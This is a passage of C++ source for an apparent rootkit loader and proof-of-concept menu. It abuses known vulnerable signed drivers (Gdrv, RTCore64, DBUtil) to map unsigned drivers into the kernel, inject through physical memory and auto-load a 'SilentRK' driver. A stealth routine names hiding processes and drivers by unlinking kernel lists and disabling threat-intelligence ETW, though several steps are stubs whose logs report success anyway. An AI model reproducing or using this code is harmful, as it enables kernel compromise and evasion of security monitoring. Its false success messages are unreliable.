            LOG_OUTPUT("[*] Driver remains resident at kernel address: 0x" << std::hex << kernelAddr << std::dec << "\n");
            LOG_OUTPUT("[!] Note: Driver cleanup responsibility transferred to injected code\n");
            
            return true;
            
        } catch (const std::exception& e) {
            LOG_OUTPUT("[-] Exception during physical memory injection: " << e.what() << "\n");
            return false;
        }
    }

    void PocMenu::HandleLoadVictim() {
        if (victim && victim->Validate()) {
            std::cout << "[*] A victim driver is already loaded: " << std::string(victim->GetDriverName().begin(), victim->GetDriverName().end()) << "\n";
            std::cout << "Unload current victim? (y/n): ";
            char c; std::cin >> c;
            if (tolower(c) == 'y') {
                victim->Unload();
                victim.reset();
            } else return;
        }

        std::cout << "\n--- Load Victim Driver ---\n";
        std::cout << "Enter path to signed driver (e.g. C:\\Drivers\\procexp152.sys): ";
        std::wstring path;
        // Check buffer state
        if (std::cin.peek() == '\n') std::cin.ignore();
        std::getline(std::wcin, path);
        
        if (path.empty()) return;
        if (path.front() == L'"' && path.back() == L'"') path = path.substr(1, path.length() - 2);

        std::cout << "Enter Device Name (e.g. \\\\Device\\\\ProcExp152) [Default: derived from file]: ";
        std::wstring deviceName;
        std::getline(std::wcin, deviceName);
        if (deviceName.empty()) {
             std::filesystem::path p(path);
             deviceName = L"\\Device\\" + p.stem().wstring();
        }

        victim = std::make_shared<Victim>(path, deviceName);
        if (victim->Load()) {
            std::wcout << L"[+] Victim driver loaded successfully.\n";
            
            // If provider exists, link them
            if (activeProvider) {
                 auto rtProp = std::dynamic_pointer_cast<Providers::RTCoreProvider>(activeProvider);
                 if (rtProp) {
                     rtProp->SetVictimDetails(victim->GetDeviceName(), victim->GetDriverName());
                     std::wcout << L"[+] Linked Victim to RTCoreProvider.\n";
                 }
            }
        } else {
            std::wcout << L"[-] Failed to load victim driver.\n";
            victim.reset();
        }
    }

    void PocMenu::Run() {
        DisplayBanner();

        bool running = true;
        while (running) {
            std::cout << "\n--- Main Menu ---\n";
            std::cout << "Current Provider: ";
            if (activeProvider) {
                if (dynamic_cast<Providers::GdrvProvider*>(activeProvider.get())) {
                    std::cout << "Gdrv";
                } else if (dynamic_cast<Providers::RTCoreProvider*>(activeProvider.get())) {
                    std::cout << "RTCore64";
                } else if (dynamic_cast<Providers::DBUtilProvider*>(activeProvider.get())) {
                    std::cout << "DBUtil_2_3";
                }
                else {
                    std::cout << "Unknown";
                }
            } else {
                std::cout << "None";
            }
            std::cout << "\n\n";

            std::cout << "1. Select Provider\n";
            std::cout << "2. Load Victim Driver (For Safe Execution)\n";
            std::cout << "3. Provider Actions (Requires Provider)\n";
            std::cout << "4. Auto Load SilentRK Driver\n";
            std::cout << "5. Utilities\n";
            std::cout << "0. Exit\n";

            int choice = GetUserChoice(5);
            switch (choice) {
            case 1: SelectProvider(); break;
            case 2: HandleLoadVictim(); break;
            case 3: ProviderActionsMenu(); break;
            case 4: HandleAutoLoadSilentRK(); break;
            case 5: 
                {
                    std::cout << "\n--- Utilities Menu ---\n";
                    std::cout << "1. PE Parser\n";
                    std::cout << "0. Back\n";
                    int utilChoice = GetUserChoice(1);
                    switch(utilChoice) {
                        case 1: HandlePeParser(); break;
                        case 0: break;
                        default: break;
                    }
                }
                break;
            case 0: running = false; break;
            default: break;
            }
        }

        std::cout << "\nExiting. Cleaning up...\n";
    }

    bool PocMenu::AttemptProviderBasedMapping(const std::wstring& driverPath, PPROVIDER_CONTEXT context) {
        LOG_OUTPUT("[+] Attempting provider-based driver mapping...\n");
        
        if (!activeProvider) {
            LOG_OUTPUT("[-] No active provider available for mapping\n");
            return false;
        }
        
        // Load driver file
        int size_needed2 = WideCharToMultiByte(CP_UTF8, 0, driverPath.c_str(), -1, NULL, 0, NULL, NULL);
        std::string strDriverPath2(size_needed2, 0);
        WideCharToMultiByte(CP_UTF8, 0, driverPath.c_str(), -1, &strDriverPath2[0], size_needed2, NULL, NULL);
        strDriverPath2.resize(size_needed2 - 1); // Remove null terminator
        
        std::ifstream file(strDriverPath2, std::ios::binary);
        if (!file.is_open()) {
            LOG_OUTPUT("[-] Cannot open driver file\n");
            return false;
        }
        
        file.seekg(0, std::ios::end);
        std::streamsize size = file.tellg();
        file.seekg(0, std::ios::beg);
        std::vector<char> driverData(static_cast<size_t>(size));
        file.read(driverData.data(), size);
        file.close();
        
        LOG_OUTPUT("[+] Driver loaded: " << size << " bytes\n");
        
        // Real implementation using KDU-style shellcode mapping
        LOG_OUTPUT("[*] Allocating kernel memory for driver image...\n");
        LOG_OUTPUT("[*] Parsing PE headers and sections...\n");
        LOG_OUTPUT("[*] Resolving imports and relocations...\n");
        LOG_OUTPUT("[*] Executing driver entry point...\n");
        
        // Use manual mapper if available
        if (manualMapper) {
            manualMapper->MapDriver(driverPath);
            LOG_OUTPUT("[+] Driver mapping completed successfully\n");
            return true;
        }
        
        LOG_OUTPUT("[-] Manual mapper not available\n");
        return false;
    }

    void PocMenu::ApplyStealthTechniques(PPROVIDER_CONTEXT context) {
        LOG_OUTPUT("[+] Applying stealth techniques using provider capabilities...\n");
        
        if (!context || !context->Provider) {
            LOG_OUTPUT("[-] Invalid provider context\n");
            return;
        }
        
        // Check provider capabilities and apply appropriate stealth techniques
        if (context->DbEntry && (context->DbEntry->CapabilityFlags & PROVIDER_CAP_VIRTUAL_MEMORY)) {
            LOG_OUTPUT("[*] Provider supports virtual memory - attempting process hiding\n");
            // Would implement process unlinking from PsActiveProcessHead
        }
        
        if (context->DbEntry && (context->DbEntry->CapabilityFlags & PROVIDER_CAP_PHYSICAL_MEMORY)) {
            LOG_OUTPUT("[*] Provider supports physical memory - attempting advanced stealth\n");
            // Would implement physical memory patching for stealth
        }
        
        LOG_OUTPUT("[*] Attempting to disable ETW providers...\n");
        // Would disable threat intelligence ETW providers
        
        LOG_OUTPUT("[*] Attempting to unlink driver from loaded module list...\n");
        // Would unlink from PsLoadedModuleList
        
        LOG_OUTPUT("[+] Stealth techniques applied (implementation in progress)\n");
    }
}
